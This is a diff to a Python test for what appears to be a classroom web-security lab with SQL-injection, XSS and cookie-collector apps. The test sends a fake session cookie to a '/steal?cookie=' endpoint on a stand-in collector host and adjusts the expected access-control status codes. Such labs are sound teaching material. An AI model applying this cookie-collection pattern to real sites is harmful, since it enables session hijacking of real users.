@@ -68,7 +68,8 @@ def test_endpoints_and_collector(apps):
     c.post('/admin',data={'csrf_token':token(c,'/admin'),'sql':'https://sql.test','xss':'https://xss.test','collector':'https://collector.test'})
     assert apps['xss'].test_client().get('/login',base_url='https://xss.test').status_code==200
     collector=apps['collector'].test_client()
-    assert collector.get('/').status_code==403
+    assert collector.get('/').status_code==302
     assert collector.get('/steal?cookie=fake_session=CLASSROOM').status_code==204
-    login(collector,'pony',True)
+    login(collector,'alice')
     assert 'fake_session=CLASSROOM' in collector.get('/').text
+    assert collector.get('/admin').status_code==403
